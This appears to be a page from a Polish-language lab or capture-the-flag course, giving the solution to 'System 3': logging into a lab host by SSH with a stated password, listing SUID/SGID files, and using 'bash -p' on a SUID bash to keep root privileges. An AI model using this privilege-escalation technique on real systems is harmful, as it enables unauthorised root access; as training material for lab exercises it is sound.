---
title: "7.6 - System 3 - Bash z zachowaniem uprawnień"
order: 6
---

> **Uwaga do rozwiązania:** `bash -p` zachowuje zastane efektywne uprawnienia, jeśli uruchamiany Bash ma odpowiednie SUID. Samo `-p` nie nadaje roota zwykłemu użytkownikowi.

```bash
ssh system3@192.168.100.107 -p 2203 #Password: pjatk
find / -type f -perm /6000 2>/dev/null #Find SUID/SGID files
bash -p #Keep effective root privileges from SUID bash
/root/solve
```
